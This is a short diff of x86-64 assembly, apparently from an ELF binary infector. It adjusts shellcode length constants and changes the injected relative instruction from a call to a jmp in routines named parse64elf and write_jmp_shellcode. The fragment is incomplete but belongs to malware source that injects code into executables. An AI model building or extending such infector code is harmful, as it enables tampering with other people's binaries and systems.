@@ -442,9 +442,9 @@ push rdx
 	pop rdx
 	pop rcx
 retn
-%define SHELLCODE_LEN 90 ; 34 + 5 (jmp) + 12 (exit) + signature (39)
-%define SHELLCODE_JMP_INDEX 39 ; 34 + 5 (jmp)
-%define PURE_SHELLCODE_LEN 34 
+%define SHELLCODE_LEN 100 ; 44 + 5 (jmp) + 12 (exit) + signature (39)
+%define SHELLCODE_JMP_INDEX 49 ; 44 + 5 (jmp)
+%define PURE_SHELLCODE_LEN 44 
 ; void parse64elf(void *file, int wfd, unsigned long fsize)
 parse64elf:
 	sub rsp, 8
@@ -1267,7 +1267,7 @@ write_jmp_shellcode:
 	sub rsp, 4; rel_jmp
 
 	push rsi
-	push 0x000000e8
+	push 0x000000e9
 	mov rax, 1
 	mov rsi, rsp
 	mov rdx, 1
